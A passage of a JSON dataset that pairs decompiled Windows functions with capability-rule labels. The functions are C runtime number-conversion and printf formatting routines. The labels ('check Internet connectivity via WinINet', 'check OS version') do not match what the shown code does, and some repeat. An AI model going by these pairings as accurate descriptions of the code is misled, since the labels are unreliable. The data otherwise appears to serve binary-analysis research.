code_r0x000140011c70;\n                        }\ncode_r0x000140011b8d:\n                        *(auStack160[0] + 0x14) = 0;\n                        uStack180 = 0x50;\n                        uStack172 = uVar5;\n                        goto code_r0x000140011450;\n                    }\n                    uVar25 = uVar12;\n                    fcn.140017bb0(uVar12, uStack280);\n                    if (CONCAT44(uVar37, uVar36) < extraout_XMM0_Qa) {\n                        dVar29 = extraout_XMM0_Qa * *0x140102650;\n                        uVar31 = SUB84(dVar29, 0);\n                        uVar32 = dVar29 >> 0x20;\n                        uVar19 = (-(uVar16 == 0) & 0x10) + 0x10;\n                        uVar16 = uVar16 == 0;\n                        if (*0x140102658 <= dVar29) {\n                            iStack248 = 0;\n                            uVar20 = 0;\n                        }\n                        else {\n                            iStack248 = dVar29;\n                            dVar33 = iStack248;\n                            dVar30 = dVar29 - dVar33;\n                            uVar31 = SUB84(dVar30, 0);\n                            uVar32 = dVar30 >> 0x20;\n                            dVar29 = dVar33;\n                            if (uStack244 == 1) {\n                                if (uVar16 != 0) {\ncode_r0x0001400113d5:\n                                    if (0.0 < dVar30) goto code_r0x0001400113df;\n                                }\ncode_r0x0001400113c4:\n                                uVar20 = 0;\n                            }\n                            else if (uStack244 == 2) {\n                                if (uVar16 == 0) goto code_r0x0001400113d5;\n                                uVar20 = 0;\n                            }\n                            else {\n                                if (dVar30 < *0x140102650) goto code_r0x0001400113c4;\ncode_r0x0001400113df:\n                                iStack248 = iStack248 + 1;\n                                uVar19 = 0x30 - uVar19;\n                                uVar20 = 0;\n                                dVar29 = iStack248;\n                            }\n                        }\n                    }\n                    else {\n                        if (uVar16 == 0) {\n                            uVar20 = 0;\n                            uVar31 = uVar34;\n                            uVar32 = uVar35;\n                            goto code_r0x000140010bfd;\n                        }\n                        iStack248 = 0;\n                        uVar20 = 0;\n                        uVar16 = 0;\n                        uVar19 = 0x20;\n                        uVar31 = SUB84(*0x140102640, 0);\n                        uVar32 = *0x140102640 >> 0x20;\n                        dVar29 = *0x140102640;\n                    }\n                }\n                else {\n                    uVar27 = uStack244 & 1;\n                    uVar20 = uVar27 ^ uVar16;\n                    if (uVar27 == uVar16) {\n                        uStack180 = (-(uVar27 == 0) & 0x10) + 0x11;\n                        goto code_r0x000140011450;\n                    }\n                    if (uVar16 != 0) {\n                        uVar19 = 0x20;\n                        uVar16 = 0;\n                        uStack180 = 0x21;\n                        iStack248 = 0;\n                        uVar31 = SUB84(*0x140102640, 0);\n                        uVar32 = *0x140102640 >> 0x20;\n                        dVar29 = *0x140102640;\n                        goto code_r0x000140010c2b;\n                    }\n                    uStack180 = 0x11;\n                    uVar31 = uVar34;\n                    uVar32 = uVar35;\n                    if (uStack204 != uVar5) {\n                        uVar27 = uVar1;\n                        if (0x1f < uVar1) {\n                            uVar13 = 1;\n                            do {\n                                uVar18 = uVar13;\n                                if (*(auStack160[0] + 0x14 + uVar18 * 4) != 0) goto code_r0x000140010bfd;\n                                uVar27 = uVar27 - 0x20;\n                                uVar25 = uVar18 + 1;\n                                uVar13 = uVar25;\n                            } while (0x1f < uVar27);\n                            uVar16 = uVar18;\n                        }\n                        if (1 < uVar27) {\n                            puVar15 = auStack160[0] + 0x18 + uVar16 * 4;\n                            uVar26 = 0;\n                            uVar16 = *puVar15;\n                            for (uVar2 = uVar16; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n                                uVar26 = uVar26 + 1;\n                            }\n                            uVar25 = uVar26;\n                            *puVar15 = uVar16 >> (uVar26 & 0x1f);\n                            if (uVar26 < uVar27 - 1) goto code_r0x000140010bfd;\n                        }\n                        uStack172 = uStack204 - 1;\n                        goto code_r0x0001400117ce;\n                    }\ncode_r0x000140010bfd:\n                    if ((uVar19 < 2) && (uStack264 != 0)) {\n                        uStack264 = 1;\n                        goto code_r0x000140011b8d;\n                    }\n                    iStack248 = 0;\n                    uVar19 = 0x10;\n                    uVar16 = 1;\n                    uVar34 = uVar31;\n                    uVar35 = uVar32;\n                    dVar29 = CONCAT44(uVar32, uVar31);\n                }\ncode_r0x000140010c2b:\n                iVar6 = uStack172 + uStack176;\n                if ((uStack264 == 0) && (uStack176 < uVar1)) {\n                    uVar27 = uVar1 - uStack176;\n                    uVar13 = fcn.140017540(auStack160[0], uVar27);\n                    uStack172 = uStack172 - uVar27;\n                    uVar25 = auStack160[0];\n                    uStack176 = uVar1;\n                    auStack160[0] = uVar13;\n                }\n                arg1_02 = fcn.140017990(uVar25, &uStack188, auStack184);\n                if (uStack188 < 0) {\n                    fcn.140016880(arg1_02, -uStack188);\n                }\n                else if (uStack188 != 0) {\n                    arg1_02 = fcn.140017540(arg1_02, uStack188);\n                }\n                uVar25 = auStack160[0];\n                if (uVar16 == 0) {\n                    auStack160[0] = fcn.140011de0(auStack160[0], arg1_02);\n                    iVar8 = *(auStack160[0] + 0x14) + -1;\n                    if (*(uVar25 + 0x14) != iVar8 && iVar8 <= *(uVar25 + 0x14)) {\n                        puVar15 = auStack160[0] + 8 + (iVar8 + 4) * 4;\n                        uVar16 = 0x1f;\n                        if (*puVar15 != 0) {\n                            for (; *puVar15 >> uVar16 == 0; uVar16 = uVar16 - 1) {\n                            }\n                        }\n                        puVar15 = uVar25 + 8 + (iVar8 + 4) * 4;\n                        uVar27 = 0x1f;\n                        if (*puVar15 != 0) {\n                            for (; *puVar15 >> uVar27 == 0; uVar27 = uVar27 - 1) {\n                            }\n                        }\n                        if ((uVar27 ^ 0x1f) <= (uVar16 ^ 0x1f)) goto code_r0x000140010d00;\n                    }\n                    if (uStack264 != 0) {\n                        uStack176 = uStack176 + 1;\n                        uStack264 = uStack176 != uVar1;\n                        goto code_r0x000140010d00;\n                    }\n                    fcn.140016880(auStack160[0], 1);\n                    uStack172 = uStack172 + 1;\n                    uStack204 = uStack204 + 1;\n                    fcn.140017070(arg1_02);\n                    fcn.140017070(uVar25);\n                    uVar27 = uStack176;\n                    if (uVar20 != 0) goto code_r0x0001400116d1;\ncode_r0x00014001132a:\n                    uVar20 = fcn.140016980(auStack160[0]);\n                    uStack264 = 0;\n                }\n                else {\n                    auStack160[0] = fcn.1400176a0(auStack160[0], arg1_02);\n                    if (uStack264 == 0) {\n                        iVar8 = *(uVar25 + 0x14) + -1;\n                        if (*(auStack160[0] + 0x14) != iVar8 && iVar8 <= *(auStack160[0] + 0x14)) {\n                            puVar15 = auStack160[0] + 8 + (iVar8 + 4) * 4;\n                            uVar27 = 0x1f;\n                            if (*puVar15 != 0) {\n                                for (; *puVar15 >> uVar27 == 0; uVar27 = uVar27 - 1) {\n                                }\n                            }\n                            puVar15 = uVar25 + 8 + (iVar8 + 4) * 4;\n                            uVar26 = 0x1f;\n                            if (*puVar15 != 0) {\n                                for (; *puVar15 >> uVar26 == 0; uVar26 = uVar26 - 1) {\n                                }\n                            }\n                            if ((uVar27 ^ 0x1f) <= (uVar26 ^ 0x1f)) goto code_r0x000140010d00;\n                        }\n                        if (uStack204 != uVar5) {\n                            auStack160[0] = fcn.140017540(auStack160[0], 1);\n                            uStack172 = uStack172 - 1;\n                            uStack204 = uStack204 - 1;\n                            fcn.140017070(arg1_02);\n                            fcn.140017070(uVar25);\n                            goto code_r0x00014001132a;\n                        }\n                        uStack176 = uStack176 - 1;\n                        uStack264 = uVar16;\n                    }\ncode_r0x000140010d00:\n                    fcn.140017070(arg1_02);\n                    fcn.140017070(uVar25);\n                    if (uVar20 != 0) goto code_r0x000140011450;\n                    if ((uStack176 + uStack172 == iVar6) && (iStack248 != 0)) {\n                        dVar29 = dVar29 * *0x140102660;\n                        dVar30 = CONCAT44(uVar32, uVar31) - *0x140102650;\n                        if ((dVar29 ^ SUB168(auVar38, 0)) <= dVar30) {\n                            if ((dVar29 < dVar30) &&\n                               (CONCAT44(uVar32, uVar31) <= *0x140102640 - dVar29 &&\n                                *0x140102640 - dVar29 != CONCAT44(uVar32, uVar31))) goto code_r0x000140011440;\n                        }\n                        else if (dVar29 <= CONCAT44(uVar32, uVar31) && CONCAT44(uVar32, uVar31) != dVar29)\n                        goto code_r0x000140011440;\n                    }\n                    if (uStack264 == 0) goto code_r0x00014001132a;\n                }\n                fcn.140017070(arg1_01);\n                fcn.140017070(arg1_00);\n                fcn.140017070(uStack280);\n                fcn.140017070(uVar12);\n            } while( true );\n        }\n        uStack264 = 1;\n        iVar6 = uStack204 + 1;\n        uStack204 = uVar5;\n        uStack172 = uVar5;\n        if (uVar5 <= iVar6) goto code_r0x00014001094a;\n        *(auStack160[0] + 0x14) = 0;\n        *arg4 = uVar5;\n        goto code_r0x000140011648;\n    }\n    if (uVar17 == 0) goto code_r0x000140010910;\n    uStack176 = uVar17 + uStack176;\n    if (0 < uStack176) {\n        fcn.140016880(auStack160[0], uVar5 - uStack172);\n        goto code_r0x000140010910;\n    }\n    if (-2 < uStack176) {\n        uStack176 = 1;\n        *(auStack160[0] + 0x14) = 0x100000001;\n        goto code_r0x000140010910;\n    }\n    *(auStack160[0] + 0x14) = 0;\n    *arg4 = uVar5;\n    if (uStack208 != 0) goto code_r0x000140011648;\n    uVar7 = (0 < *(auStack160[0] + 0x14)) * 2 | 0x50;\n    goto code_r0x000140011768;\ncode_r0x000140011440:\n    uStack180 = uStack180 | uVar19;\ncode_r0x000140011450:\n    uStack208 = uVar28;\n    uVar27 = uStack176;\n    if (uStack264 == 0) {\ncode_r0x0001400116d1:\n        uVar7 = uVar1 - uVar27;\n        uStack264 = uVar7;\n        if (uVar7 != 0) {\n            if (uVar7 < 1) {\n                fcn.140016880(auStack160[0], uVar27 - uVar1);\n            }\n            else {\n                auStack160[0] = fcn.140017540(auStack160[0], uVar7);\n            }\n            uStack264 = 0;\n            uStack172 = uStack172 - uVar7;\n        }\n    }\n    goto code_r0x000140011463;\n    while (uVar7 = *puVar15,  puVar15 = puVar15 + 1,  uVar7 == 0xffffffff) {\ncode_r0x000140011aba:\n        if (auStack160[0] + 0x18 + (uStack176 >> 5) <= puVar15) {\n            if (((uStack176 & 0x1f) == 0) || ((-1 << (uStack176 & 0x1f) | *puVar15) == 0xffffffff)) {\n                uStack176 = 1;\n                *(auStack160[0] + 0x14) = 0x100000001;\n                uStack180 = 0x21;\n                uStack172 = (uVar1 - 1) + uVar5;\n                uVar27 = uStack264;\n                goto code_r0x0001400116d1;\n            }\n            break;\n        }\n    }\n    uStack180 = 0x11;\n    if ((*(auStack160[0] + 0x18) & 1) != 0) {\ncode_r0x000140011d7d:\n        auStack160[0] = fcn.14000fc00(auStack160[0]);\n        puVar15 = auStack160[0] + 0x18 + (*(auStack160[0] + 0x14) + -1) * 4;\n        uVar7 = 0x1f;\n        if (*puVar15 != 0) {\n            for (; *puVar15 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n            }\n        }\n        if ((-uStack176 & 0x1f) != (uVar7 ^ 0x1f)) {\n            uStack176 = uStack176 + 1;\n        }\n        uStack180 = 0x21;\n        goto code_r0x000140011450;\n    }\ncode_r0x000140011463:\n    *arg4 = uStack172;\n    fcn.140017070(arg1_01);\n    fcn.140017070(arg1_00);\n    fcn.140017070(uStack280);\n    fcn.140017070(iVar11);\n    fcn.140017070(uVar12);\n    if (arg3[2] < uStack172) {\n        uVar7 = arg3[3] & 3;\n        if (uVar7 == 2) {\n            if (iStack252 == 0) goto code_r0x0001400117f8;\n        }\n        else if (uVar7 == 3) {\n            if (iStack252 != 0) goto code_r0x0001400117f8;\n        }\n        else if (uVar7 == 1) {\ncode_r0x0001400117f8:\n            uStack180 = 0xa3;\n            *(auStack160[0] + 0x14) = 0;\n            puVar14 = sub.msvcrt.dll__errno();\n            *puVar14 = 0x22;\n            *arg4 = arg3[2] + 1;\n            goto code_r0x000140011550;\n        }\n        fcn.140017070(auStack160[0]);\n        uVar7 = *arg3;\n        auStack160[0] = 0;\n        uStack180 = 0x11;\n        *arg4 = arg3[2];\n        uVar12 = in_stack_00000028 + (uVar7 + 0x1f >> 5) * 4;\n        if (in_stack_00000028 < uVar12) {\n            sub.msvcrt.dll_memset();\n        }\n        uVar7 = uVar7 & 0x1f;\n        if (uVar7 != 0) {\n            puVar15 = uVar12 - 4;\n            *puVar15 = *puVar15 >> (0x20U - uVar7 & 0x1f);\n        }\n    }\ncode_r0x000140011550:\n    if (uStack264 != 0) {\n        if (uStack208 == 0) {\n            uVar7 = (0 < *(auStack160[0] + 0x14)) * 2 | uStack180 & 0xfffffff8;\n            uVar5 = uStack180 & 0x30;\n            uStack180 = uVar7;\n            if (uVar5 != 0) {\ncode_r0x000140011768:\n                uStack180 = uVar7 | 0x40;\n                puVar14 = sub.msvcrt.dll__errno();\n                *puVar14 = 0x22;\n            }\n        }\n        else {\ncode_r0x000140011648:\n            *(auStack160[0] + 0x14) = 0;\n            uStack180 = 0x50;\n            puVar14 = sub.msvcrt.dll__errno();\n            *puVar14 = 0x22;\n        }\n    }\ncode_r0x0001400105f8:\n    if (arg2 != NULL) {\n        *arg2 = pcStack168;\n    }\n    if (iStack252 != 0) {\n        uStack180 = uStack180 | 8;\n    }\ncode_r0x000140010626:\n    if (auStack160[0] != 0) {\n        fcn.140017ca0(in_stack_00000028, uVar1, auStack160[0]);\n        fcn.140017070(auStack160[0]);\n    }\n    return uStack180;\n}\n",
        "token_count": 11451
    },
    "14001249": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140012490(uint64_t arg1, uint64_t noname_1, int64_t *arg3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    ulong arg1_00;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    uint8_t uVar11;\n    int32_t iVar12;\n    uint8_t uVar13;\n    int32_t iVar14;\n    uint8_t *puVar15;\n    uint8_t uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    bool bVar19;\n    ulong var_8h;\n    uchar auStack104 [32];\n    uint8_t auStack72 [8];\n    \n    uVar16 = arg1 & 0xffffffff;\n    iVar17 = arg1 & 0xffffffff;\n    if (arg1 == 0x6f) {\n        iVar18 = *(arg3 + 2);\n        uVar10 = *(arg3 + 1);\n        if ((uVar10 & 0x1000) != 0) {\n            arg1_00 = 3;\n            goto code_r0x0001400124d9;\n        }\n        iVar14 = *(arg3 + 0xc);\n        iVar3 = fcn.14000e880(arg1);\n        uVar4 = 3;\n        uVar11 = 7;\n        puVar6 = &stack0xffffffffffffff98 + -iVar3;\n        puVar9 = &stack0xffffffffffffffb8 + -iVar3;\ncode_r0x00014001259d:\n        puVar5 = puVar6;\n        puVar15 = puVar9;\n        if (noname_1 == 0) goto code_r0x000140012538;\ncode_r0x0001400125a5:\n        puVar7 = puVar15;\n        do {\n            puVar9 = puVar7 + 1;\n            uVar1 = uVar11 & noname_1;\n            uVar13 = uVar1 + 0x30;\n            uVar1 = uVar1 + 0x37 | uVar16 & 0x20;\n            if (uVar13 < 0x3a) {\n                uVar1 = uVar13;\n            }\n            noname_1 = noname_1 >> (uVar4 & 0x3f);\n            *puVar7 = uVar1;\n            puVar7 = puVar9;\n        } while (noname_1 != 0);\n        puVar5 = puVar6;\n        if (puVar9 == puVar15) goto code_r0x000140012538;\n        if (iVar18 < 1) goto code_r0x00014001254a;\ncode_r0x0001400125eb:\n        iVar2 = puVar9 - puVar15;\n        iVar12 = iVar18 - iVar2;\n        if (0 < iVar12) {\n            puVar7 = puVar9 + iVar12;\n            *(puVar6 + -8) = 0x140012616;\n            sub.msvcrt.dll_memset(puVar9, 0x30, iVar12);\n            goto code_r0x000140012616;\n        }\n        puVar7 = puVar9;\n        if (iVar17 == 0x6f) {\ncode_r0x000140012554:\n            if ((*(arg3 + 9) & 8) != 0) {\n                *puVar7 = 0x30;\n                puVar7 = puVar7 + 1;\n            }\n            goto code_r0x000140012616;\n        }\n        if (puVar9 == puVar15) goto code_r0x0001400128b8;\n        if (iVar2 < iVar14) {\n            uVar10 = *(arg3 + 1);\n            iVar14 = iVar14 - iVar2;\n            *(arg3 + 0xc) = iVar14;\n            if ((uVar10 & 0x800) == 0) goto code_r0x0001400126c9;\n            goto code_r0x0001400126a0;\n        }\n        *(arg3 + 0xc) = 0xffffffff;\ncode_r0x000140012640:\n        puVar8 = puVar9;\n        if ((*(arg3 + 9) & 8) != 0) {\n            *puVar9 = uVar16;\n            puVar8 = puVar9 + 2;\n            puVar9[1] = 0x30;\n        }\ncode_r0x000140012651:\n        iVar14 = -1;\n        puVar9 = puVar8;\n    }\n    else {\n        iVar18 = *(arg3 + 2);\n        uVar10 = *(arg3 + 1);\n        if ((uVar10 & 0x1000) == 0) {\n            iVar14 = *(arg3 + 0xc);\n            iVar3 = fcn.14000e880(arg1);\n            uVar4 = 4;\n            uVar11 = 0xf;\n            puVar6 = &stack0xffffffffffffff98 + -iVar3;\n            puVar9 = &stack0xffffffffffffffb8 + -iVar3;\n            goto code_r0x00014001259d;\n        }\n        arg1_00 = 4;\ncode_r0x0001400124d9:\n        iVar14 = *(arg3 + 0xc);\n        iVar3 = fcn.14000e880(arg1_00);\n        uVar4 = arg1_00;\n        iVar3 = -iVar3;\n        puVar6 = &stack0xffffffffffffff98 + iVar3;\n        puVar9 = &stack0xffffffffffffffb8 + iVar3;\n        uVar11 = (iVar17 != 0x6f) * '\\b' + 7;\n        puVar5 = &stack0xffffffffffffff98 + iVar3;\n        puVar15 = puVar9;\n        if (noname_1 != 0) goto code_r0x0001400125a5;\ncode_r0x000140012538:\n        *(arg3 + 1) = uVar10 & 0xfffff7ff;\n        puVar6 = puVar5;\n        puVar7 = puVar9;\n        if (0 < iVar18) goto code_r0x0001400125eb;\ncode_r0x00014001254a:\n        if (iVar17 == 0x6f) goto code_r0x000140012554;\ncode_r0x000140012616:\n        puVar9 = puVar7;\n        if ((puVar7 == puVar15) && (iVar18 != 0)) {\ncode_r0x0001400128b8:\n            *puVar9 = 0x30;\n            iVar2 = (puVar9 + 1) - puVar15;\n            puVar9 = puVar9 + 1;\n        }\n        else {\n            iVar2 = puVar7 - puVar15;\n        }\n        if (iVar14 <= iVar2) {\n            *(arg3 + 0xc) = 0xffffffff;\n            if (iVar17 == 0x6f) {\n                if (puVar9 <= puVar15) {\n                    return;\n                }\n                uVar10 = *(arg3 + 1);\n                iVar17 = -2;\n                iVar14 = -1;\n                goto code_r0x000140012720;\n            }\n            goto code_r0x000140012640;\n        }\n        iVar14 = iVar14 - iVar2;\n        uVar10 = *(arg3 + 1);\n        *(arg3 + 0xc) = iVar14;\n        if ((iVar17 == 0x6f) || (puVar7 = puVar9,  (uVar10 & 0x800) == 0)) {\n            if ((-1 < iVar18) || ((uVar10 & 0x600) != 0x200)) {\ncode_r0x0001400126c9:\n                iVar17 = iVar14 + -1;\n                if ((uVar10 & 0x400) == 0) {\n                    do {\n                        *(puVar6 + -8) = 0x1400126ed;\n                        fcn.140012060(0x20, arg3);\n                        bVar19 = iVar17 != 0;\n                        iVar14 = iVar17 + -1;\n                        iVar17 = iVar14;\n                    } while (bVar19);\n                    iVar17 = -2;\n                    if (puVar15 < puVar9) goto code_r0x00014001271d;\n                    return;\n                }\n                if (puVar9 <= puVar15) goto code_r0x000140012784;\n                goto code_r0x000140012720;\n            }\n            puVar8 = puVar9 + iVar14;\n            *(puVar6 + -8) = 0x140012890;\n            sub.msvcrt.dll_memset(puVar9, 0x30, iVar14);\n            if (iVar17 != 0x6f) goto code_r0x00014001289a;\n            goto code_r0x000140012651;\n        }\ncode_r0x0001400126a0:\n        iVar14 = iVar14 + -2;\n        puVar8 = puVar7;\n        if (iVar14 < 1) {\ncode_r0x0001400126ad:\n            *puVar8 = uVar16;\n            puVar8[1] = 0x30;\n            puVar9 = puVar8 + 2;\n        }\n        else {\n            if ((-1 < iVar18) || ((uVar10 & 0x600) != 0x200)) {\n                *puVar7 = uVar16;\n                puVar9 = puVar7 + 2;\n                puVar7[1] = 0x30;\n                goto code_r0x0001400126c9;\n            }\n            puVar8 = puVar7 + iVar14;\n            *(puVar6 + -8) = 0x140012932;\n            sub.msvcrt.dll_memset(puVar7, 0x30, iVar14);\ncode_r0x00014001289a:\n            iVar14 = -1;\n            puVar9 = puVar8;\n            if ((uVar10 & 0x800) != 0) goto code_r0x0001400126ad;\n        }\n    }\n    if (puVar9 <= puVar15) {\n        return;\n    }\n    uVar10 = *(arg3 + 1);\n    iVar17 = iVar14 + -1;\ncode_r0x000140012720:\n    do {\n        puVar9 = puVar9 + -1;\n        if (((uVar10 & 0x4000) == 0) && (iVar18 = *(arg3 + 0x24),  *(arg3 + 5) == iVar18 || *(arg3 + 5) < iVar18)) {\ncode_r0x000140012712:\n            *(arg3 + 0x24) = iVar18 + 1;\n        }\n        else {\n            if ((uVar10 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar9;\n                iVar18 = *(arg3 + 0x24);\n                goto code_r0x000140012712;\n            }\n            *(puVar6 + -8) = 0x140012747;\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n        }\n        iVar18 = iVar17;\n        if (puVar9 <= puVar15) {\n            while (iVar17 = iVar18,  0 < iVar14) {\n                uVar10 = *(arg3 + 1);\ncode_r0x000140012784:\n                if (((uVar10 & 0x4000) != 0) ||\n                   (iVar18 = *(arg3 + 0x24),  *(arg3 + 5) != iVar18 && iVar18 <= *(arg3 + 5))) {\n                    if ((uVar10 & 0x2000) == 0) {\n                        *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                        iVar18 = *(arg3 + 0x24);\n                    }\n                    else {\n                        *(puVar6 + -8) = 0x1400127a9;\n                        sub.msvcrt.dll_fputc(0x20);\n                        iVar18 = *(arg3 + 0x24);\n                    }\n                }\n                *(arg3 + 0x24) = iVar18 + 1;\n                iVar18 = iVar17 + -1;\n                iVar14 = iVar17;\n            }\n            return;\n        }\ncode_r0x00014001271d:\n        uVar10 = *(arg3 + 1);\n    } while( true );\n}\n",
        "token_count": 2869
    },
    "14001294": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140012940(uint64_t arg1, int64_t *arg2)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong var_8h;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    \n    iVar2 = *(arg2 + 2);\n    uVar9 = *(arg2 + 1);\n    iVar5 = *(arg2 + 0xc);\n    auStack112[0] = 0x140012997;\n    iVar3 = fcn.14000e880(arg1);\n    iVar3 = -iVar3;\n    pcVar1 = &stack0xffffffffffffffb8 + iVar3;\n    if ((uVar9 & 0x80) == 0) {\ncode_r0x0001400129b6:\n        pcVar6 = pcVar1;\n        if (arg1 != 0) goto code_r0x0001400129c2;\n    }\n    else {\n        if (-1 < arg1) {\n            uVar9 = uVar9 & 0xffffff7f;\n            *(arg2 + 1) = uVar9;\n            goto code_r0x0001400129b6;\n        }\n        arg1 = -arg1;\ncode_r0x0001400129c2:\n        pcVar6 = pcVar1;\n        while( true ) {\n            pcVar7 = pcVar6;\n            pcVar6 = pcVar7 + 1;\n            uVar4 = arg1 / 10;\n            *pcVar7 = arg1 + uVar4 * -10 + '0';\n            if (arg1 < 10) break;\n            arg1 = uVar4;\n            if ((((pcVar1 != pcVar6) && ((uVar9 & 0x1000) != 0)) && (*(arg2 + 4) != 0)) &&\n               ((pcVar6 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar6 = ',';\n                pcVar6 = pcVar7 + 2;\n            }\n        }\n    }\n    pcVar7 = pcVar6;\n    if (iVar2 < 1) {\ncode_r0x000140012a80:\n        pcVar6 = pcVar7;\n        if ((pcVar1 != pcVar7) || (iVar2 == 0)) goto code_r0x000140012a91;\n    }\n    else {\n        iVar8 = iVar2 - (pcVar6 - pcVar1);\n        if (0 < iVar8) {\n            pcVar7 = pcVar6 + iVar8;\n            *(&stack0xffffffffffffff90 + iVar3) = 0x140012a80;\n            sub.msvcrt.dll_memset(pcVar6, 0x30, iVar8);\n            goto code_r0x000140012a80;\n        }\n        pcVar7 = pcVar1;\n        if (pcVar1 != pcVar6) goto code_r0x000140012a91;\n    }\n    *pcVar7 = '0';\n    pcVar6 = pcVar7 + 1;\ncode_r0x000140012a91:\n    if (0 < iVar5) {\n        iVar5 = iVar5 - (pcVar6 - pcVar1);\n        *(arg2 + 0xc) = iVar5;\n        if (0 < iVar5) {\n            if ((uVar9 & 0x1c0) != 0) {\n                *(arg2 + 0xc) = iVar5 + -1;\n            }\n            if ((iVar2 < 0) && ((uVar9 & 0x600) == 0x200)) {\n                iVar2 = *(arg2 + 0xc);\n                *(arg2 + 0xc) = iVar2 + -1;\n                if (0 < iVar2) {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140012c79;\n                    sub.msvcrt.dll_memset(pcVar6, 0x30, iVar2);\n                    *(arg2 + 0xc) = 0xffffffff;\n                    pcVar6 = pcVar6 + iVar2;\n                }\n            }\n            else if (((uVar9 & 0x400) == 0) && (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140012cad;\n                    fcn.140012060(0x20, arg2);\n                    iVar2 = *(arg2 + 0xc);\n                    *(arg2 + 0xc) = iVar2 + -1;\n                } while (0 < iVar2);\n                uVar9 = *(arg2 + 1);\n            }\n        }\n    }\n    if ((uVar9 & 0x80) == 0) {\n        if ((uVar9 & 0x100) == 0) {\n            if ((uVar9 & 0x40) != 0) {\n                *pcVar6 = ' ';\n                pcVar6 = pcVar6 + 1;\n            }\n        }\n        else {\n            *pcVar6 = '+';\n            pcVar6 = pcVar6 + 1;\n        }\n    }\n    else {\n        *pcVar6 = '-';\n        pcVar6 = pcVar6 + 1;\n    }\n    if (pcVar1 < pcVar6) {\n        do {\n            pcVar6 = pcVar6 + -1;\n            if (((uVar9 & 0x4000) == 0) && (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) == iVar2 || *(arg2 + 5) < iVar2)) {\ncode_r0x000140012afa:\n                *(arg2 + 0x24) = iVar2 + 1;\n            }\n            else {\n                if ((uVar9 & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = *pcVar6;\n                    iVar2 = *(arg2 + 0x24);\n                    goto code_r0x000140012afa;\n                }\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140012b32;\n                sub.msvcrt.dll_fputc();\n                *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar6) break;\n            uVar9 = *(arg2 + 1);\n        } while( true );\n    }\n    iVar2 = *(arg2 + 0xc);\n    while( true ) {\n        *(arg2 + 0xc) = iVar2 + -1;\n        if (iVar2 < 1) break;\n        if (((*(arg2 + 1) & 0x4000) != 0) ||\n           (iVar5 = *(arg2 + 0x24),  iVar2 = iVar2 + -1,  *(arg2 + 5) != iVar5 && iVar5 <= *(arg2 + 5))) {\n            if ((*(arg2 + 1) & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar5 = *(arg2 + 0x24);\n                iVar2 = *(arg2 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140012b8a;\n                sub.msvcrt.dll_fputc();\n                iVar5 = *(arg2 + 0x24);\n                iVar2 = *(arg2 + 0xc);\n            }\n        }\n        *(arg2 + 0x24) = iVar5 + 1;\n    }\n    return;\n}\n",
        "token_count": 1766
    },
    "140012e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
